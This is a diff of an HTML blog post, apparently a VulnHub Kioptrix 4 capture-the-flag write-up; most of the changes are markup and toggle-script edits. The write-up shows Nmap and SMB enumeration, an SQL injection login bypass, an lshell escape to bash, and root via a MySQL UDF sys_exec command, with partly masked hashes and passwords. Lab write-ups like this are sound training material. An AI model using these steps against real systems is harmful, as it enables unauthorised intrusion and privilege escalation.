@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,13 +33,13 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: Level 1.3 (#4)</h1>
-                  <p class="nested"><a href="/posts/20190929_vulnhub-kioptrix3.html"> « </a>📅 published on <code>08/Oct/2019</code><a href="/posts/20191009_vulnhub-kioptrix5.html"> » </a></p>
+                  <p><a href="/posts/20190929_vulnhub-kioptrix3.html"> « </a>📅 published on <code>08/Oct/2019</code><a href="/posts/20191009_vulnhub-kioptrix5.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix4/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Tue Oct  8 15:47:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/xml/_quick_tcp_nmap.xml 192.168.92.131
+<pre class="nested"><code># Nmap 7.70 scan initiated Tue Oct  8 15:47:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/xml/_quick_tcp_nmap.xml 192.168.92.131
 Nmap scan report for 192.168.92.131
 Host is up, received arp-response (0.0012s latency).
 Scanned at 2019-10-08 15:47:03 PDT for 35s
@@ -136,7 +103,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. From the SMB scan, we find that there are 3 users (other than <code>root</code>) on the target system:  </p>
-<p class="nested"re><code>===============================
+<pre class="nested"><code>===============================
 |    Users on 192.168.92.131  |
 ===============================
 index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody Name: nobody  Desc: (null)
@@ -147,21 +114,21 @@ index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,, De
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
 80/tcp   |  http         |  Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
 137/udp  |  netbios-ns   |  Microsoft Windows netbios-ns (workgroup: WORKGROUP)
 139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  |  netbios-ssn  |  Samba smbd 3.0.28a (workgroup: WORKGROUP)
 </code></pre>
 
-<h4>Users</h4>
-<p class="nested"re><code>ssh: root, robert, john, loneferret
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>ssh: root, robert, john, loneferret
 </code></pre>
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We find a login page at <code>http://192.168.92.131:80/index.php</code> and successfully bypass it via a sqli. Once logged in, the webapp shows the unhashed/cleartext password for user <code>john</code>. We repeat the process to obtain password for user <code>robert</code> as well (<code>loneferret</code> is not registered on this web application):  </p>
-<p class="nested"re><code>name: john
+<pre class="nested"><code>name: john
 password: ' or 1=1 -- -
 
 name: robert
@@ -172,17 +139,17 @@ password: ' or 1=1 -- -
 <p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot02.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix4/screenshot03.png" />  </p>
 <p class="nested">2. We successfully ssh as user <code>john</code> since this user has reused their web application credentials:  </p>
-<p class="nested"re><code>ssh john@192.168.92.131
+<pre class="nested"><code>ssh john@192.168.92.131
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot04.png" />  </p>
 <p class="nested">3. We find ourselves in a restricted <a href="https://github.com/ghantoos/lshell">lshell</a> that severly limits usability. We escape this restricted shell by running the <code>echo</code> command with <code>os.system</code> function:  </p>
-<p class="nested"re><code>echo os.system('/bin/bash')
+<pre class="nested"><code>echo os.system('/bin/bash')
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot05.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>john@Kioptrix4&gt; id
+<pre class="nested"><code>john@Kioptrix4&gt; id
 uid=1001(john) gid=1001(john) groups=1001(john)
 john@Kioptrix4&gt;  
 john@Kioptrix4&gt; uname
@@ -211,14 +178,14 @@ robert
 <p class="nested">2. We explore running processes and find that <code>mysql</code> is executing with elevated privileges (pid: 4638). We search for the required <code>mysql</code> shared object file and find it at <code>/usr/lib/lib_mysqludf_sys.so</code>. This means we can run custom commands from within <code>mysql</code> shell as user <code>root</code>:  </p>
 <p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot07.png" />  </p>
 <p class="nested">3. We connect to <code>mysql</code> as user <code>root</code> and execute a command to add user <code>john</code> to the <code>admin</code> group:  </p>
-<p class="nested"re><code>mysql -h localhost -u root -p
+<pre class="nested"><code>mysql -h localhost -u root -p
   select sys_exec(&quot;usermod -a -G admin john&quot;);
   exit
 </code></pre>
 
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot08.png" />  </p>
 <p class="nested">4. Now we can change to user <code>root</code> and complete the challenge:  </p>
-<p class="nested"re><code>sudo su
+<pre class="nested"><code>sudo su
 cat /root/congrats.txt
 </code></pre>
 
@@ -226,14 +193,14 @@ cat /root/congrats.txt
 <p class="nested"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot10.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<p class="nested"re><code>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:............
+<pre class="nested"><code>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:............
 loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375.............
 john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:............
 robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:............
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<p class="nested"re><code>liggoat: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
+<pre class="nested"><code>liggoat: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 </code></pre>
 
@@ -245,19 +212,17 @@ ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 <li><a href="https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/</a>  </li>
 <li><a href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html">https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20190929_vulnhub-kioptrix3.html">[VulnHub] Kioptrix: Level 1.2 ...</a> « | » <a href="/posts/20191009_vulnhub-kioptrix5.html">[VulnHub] Kioptrix: 2014 (#5)...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190929_vulnhub-kioptrix3.html">[VulnHub] Kioptrix: Level 1.2 ...</a> « | » <a href="/posts/20191009_vulnhub-kioptrix5.html">[VulnHub] Kioptrix: 2014 (#5)...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -265,6 +230,10 @@ ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
